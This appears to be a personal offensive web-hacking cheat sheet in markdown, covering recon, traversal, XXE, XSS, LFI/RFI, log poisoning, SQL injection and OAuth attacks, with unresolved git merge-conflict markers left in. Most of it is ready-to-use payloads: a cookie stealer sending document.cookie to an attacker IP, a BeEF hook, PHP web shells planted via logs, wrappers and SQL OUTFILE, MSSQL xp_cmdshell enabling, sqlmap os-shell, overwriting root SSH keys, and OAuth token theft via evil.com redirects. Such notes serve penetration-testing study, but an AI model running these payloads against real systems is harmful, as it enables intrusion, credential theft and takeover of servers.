# Intro

This is a cheat sheet for exploitation of OWASP Top 10.

It is the followed by more refined attacks. 


## recon

### Domain intel

`https://crt.sh/?q=qmspot.com`
dnsrecon
subslister
`host $IP`
dnsreaper


<<<<<<< HEAD
### Web server detection and vuln scan

```bash

docker run -v $(pwd):/home/rustscan/  -it --rm --name rustscan rustscan/rustscan:latest --top -a /home/rustscan/targets.txt -b 1000

subfinder -d example.com | $HOME/go/bin/httpx | tee urls.txt

gowitness file -f urls.txt

gowitness server --address 0.0.0.0:7171

nuclei -list urls.txt


```

=======
### Web server detection

```bash

cat amass_enum_result.txt \
aquatone -ports xlarge -scan-timeout 500 -out $(date +'%y%m%d') -threads 100 \
nuclei -list $(date +'%y%m%d')/aquatone_urls.txt

```

### vuln scan

nuclei -list hosts.txt
nikto

>>>>>>> f54a3d3c9486cd2084fe945ccc465a6ad39339d2
## Download site copy

This ia gonna loot a `/folder` 

```bash
wget -r -np -R "index.html*" https://target.to.loot/folder/
```

<<<<<<< HEAD
## SAML
## OAuth
## JWT
## Vertical ccess control
## Horizontal ccess control
## SQLi
## OS
## SSTI
## XXE
## XSLT
## Deserilization
## Race condition
## CORS
## X-domain
## XSS
## CSRF
## CSTI
## Encryption
## Request Smuggling
## Cache Poisoning
=======
>>>>>>> f54a3d3c9486cd2084fe945ccc465a6ad39339d2

## Directory traversal

Find parameters vulnerable to `../`

You may need to bypass WAF

`http://localhost/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

Or to provide path as is 

`curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`

Enjoy reading sensitive information.

## XXE injection

It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/

For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files

1. Detect XXE
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
2. Exploit 
`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

## Security Misconfigurations

* Accessible S3 Buckets
* Non functional additional features enabled: like status pages, accounts or privileges
* Default credentials
* Verbose error messages disclosing system properties
* Not using HTTP and cookies security headers
* Non patched systems

## XXS

1. Detect XXS

Submit special characters and see if they are later present in the source code

`xpyxpy " ; < > `


Then look for `xpyxpy` in source code to identify injection points.

```html
<td> John</td><td>I would eat tacos here every day if I could!</td></tr><tr><td> ok</td><td>doki</td></tr><tr><td> fg</td><td>"xpyxpy ; < > ' '</td></tr>	
```


2. Confirm XXS

Alert() is dead: https://portswigger.net/research/alert-is-dead-long-live-print

Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.

Payloads: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
#get document cookies

<script>print(document.cookie)</script>

#get host ip
<script>print(window.location.host)</script>

```
## Script from file
For instance can be used to hook to BeeF browser hijacker.
```
<script src="http://192.168.119.xxx:3000/hook.js"></script>
```

## iframe injection

* Invisible iframe can be inserted into unsanitzed input

```
<iframe src=http://google.com height=”0” width=”0”></iframe>
```
This can be however filtered out by user's browser

## Cookies manipulation

### Important security parameters

* Secure: only send the cookie over HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

* HttpOnly: deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload can steal the cookie.

### Cookie Stealer Sample script

1. Find XSS vulnerability
2. Craft and inject payload
```
<script>new Image().src="http://IP/some.jpg?output="+document.cookie;</script>
```

### Use Kali's BeEF

BeeF can be used to get system info, users, rev shell etc.

## Insecure Deserialization

tbd properly

## Framework identification

* Wappalyzer
* Favicon
```bash
# grab the favicon like this 

curl https://ip.site.com/sites/favicon/images/favicon.ico | md5sum

#Then find the framework

https://github.com/nmap/nmap/blob/master/nselib/data/favicon-db

```
* Inspect Headers
`user@machine$ curl http://MACHINE_IP -v`

## Fuzzing

* https://github.com/ffuf/ffuf
* gobuster
* dibr

## My approach to Dirbusting

1. Quick scan with default dirb without recusive folder search
`dirb http://IP/ -r`

2. scan for common directories non recursively with gobuster first:
`gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/common.txt`

3. then scan recursively within found directories

`dirb http://ip /usr/share/seclists/Discovery/Web-Content/big.txt -X .html,.php,.cgi`

4. finally you can also fuzz the discovered content or anything else within head or requests

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)

Fuzzing for POST requests

`ffuf -w passwords.txt -u http://192.168.123.52/login.php -H "Content-Type: application/x-www-form-urlencoded" -H "DNT: 1" -H "Upgrade-Insecure-Requests: 1" -d "username=admin&password=FUZZ&debug=0" -H "User-Agent: Fool"  -fr "Failed"`

# Other Web Attacks

## LFI

* detect directory traversal and attempt LFI to get RCE!
* LFI allows executing files (not reading!)
* modify and contaminate some log file
* use LFI to trigger contaminated file

1. Contaminate Logs modifying the request header

`User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `

or 

`User-Agent: <?php echo system($_GET['cmd']); ?>`

2. send request to poison

http://10.11.0.xx/

3. access these logs externally (xampp on windows in this case) but without the poisoned header to execute it

`http://10.11.0.xx/menu.php?file=../../../../../../../var/log/apache2/access.log&cmd=whoami`


### PHP wrappers

Use wrappers to bypass filters.

```bash

# lets access LFI and encode the output as base64

curl http://localhost/index.php?page=php://filter/convert.base64-encode/resource=config.php

# decode base64

echo $b64_output | base64 -d

# also possible to achieve RCE

# 1. encode payload 

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

# 2. use wrapper

curl "http://localhost/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## RFI

* create malicious file evil.txt with payload for php or for any other platform

`<?php echo shell_exec($_GET['cmd']); ?>`

This is how evil.txt can be accessed from the victim host hosted on attacker side

`http://VICTIM.IP/menu.php?file=http://ATTACKER.IP/evil.txt?`

* Include %00 or ? to trick php into terminating the string or considering it as part of URL
* To enhance attacks wrappers can be used. Here are php wrappers

```
#data wrapper
http://10.11.xx.xx/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```
Payload after text/plain can either plain text or base64 encoded.

Here follos example of base64 payload. Base64 is better as it is less detectable and causes less errors.

```
http://192.168.xxx.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

http://192.168.xxx.10/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pg==
```

## Log Poisoning

* submit a request that includes some malicious code

```php

#submit simple php backdoor

nc 10.10.10.xxx 80

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

```

* trigger malicious log

```bash

http://10.10.10.xxx /menu.php?file=../../../../var/log/apache2/access.log&cmd=whoami

```

* tip: `for reverse shell encode the command as url` in Burp or so

## File Uploads

* upload and find path to the file to execute it
* if execution not possible then try overwriting system files if directory traversal aso possible:

```bash

# overwrite ssh keys

# craft malicious key

cat bad.pub > authorized_keys

# overwrite auth keys with attackers pulic key

http://10.10.10.xxx /menu.php?file=../../../../../root/.ssh/authorized_keys

```


## API


### identify endpoints

* look for version conventions like `/some_service/v1` or v2 or v3 etc.
* Prepare pattern for ffuf to identify api endpoints

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/FUZZ/v1/ -mc 200

```

Or use `gobuster`

`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`

where pattern is like 

```txt
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
```

### identify services

Once `endpoint` identifued, look for services


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/FUZZ -mc 200

```

the look for subservices once service_A identified


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/service_A/subservice_A1 -mc 200

```

### identify Methods


```bash

ffuf -w test_methods.txt -u https://ip/endpoint_name/v1/user/change_password -X FUZZ -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4" \
-d '{"name": "admin", "password": "hacked"}' -fr "error"

# where FUZZ is replaced by POST, PUT, GET methods by using a regular token obtained throughout the session

```

* No error mean that this particular method worked
* particularly here admin password might have been changed




## SQL injection

Connect

`mysql -u root -p'pass' -h ip`

A very nice cheat sheet is provided by Portswigger: https://portswigger.net/web-security/sql-injection/cheat-sheet


### Test for SQLi vulnerability
* It is necessary to identify a possible SQLi entry point
* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):

```bash
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content

Multiple encoding

%%2727
%25%27

Merging characters

`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP

Logic Testing

page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

Weird characters

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


### MYSQL Comments
-- - Note the space after the double dash
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MYSQL version 3.23.02

-- - to emphasize space

### Load files using SQLi
```bash
UNION SELECT 1, load_file(/etc/passwd) #

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

### Write files using SQLi

```bash

#dont forget to encode

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

### EXEC shell in MSSQL

```powershell

# inject as a stacked query

12345'; EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'  -- pFml

```

### PostgreSQL

use psql in kali

### Find injectable parameters using SQLMAP

```bash
sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" 
```

Once injection point is found, exploit it to dump or get shell

```bash

sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" -p mail-list --os-shell --level=5 --risk=3

```


## hacking wordpress panel RCE

* create own reverse shell plugin https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

* use some pre-made plugin https://www.exploit-db.com/exploits/36374

## Fingerprinting target


### Canary Token

* get victim system info
* generate tracking token 
`https://www.canarytokens.org/generate`
* create `web bug/ URL token`
* send token to target
* when triggered check web hook logs or mail

## OAuth

### Recon

* if login is redirected to other website than it is a strong indication that OAuth is used

* look for indicators of authorization endpoint

`/authorization` endpoint containing query parameters: `client_id, redirect_uri, and response_type`

```bash

# example of auth request (copyright portswigger)

GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com

```

* once auth server is known look for configurations via GET to

```bash

/.well-known/oauth-authorization-server
/.well-known/openid-configuration

```

* from there one may have several options: register rogue endpoint, ...

### Steal OAuth token via referrer

Source `https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/#stealing-oauth-token-via-referer`

```bash

# simple malicious redirect

https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful

https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com

# Redirect to an accepted Open URL like google to get the access token 

https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com

https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F


# the scope to bypass a filter on redirect_uri:

https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
Executing XSS via redirect_uri

https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>

```

### Register rogue endpoint

## OpenID connect

* OAuth is not mean for authentication
* OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication
* it enables authentication on top of OAuth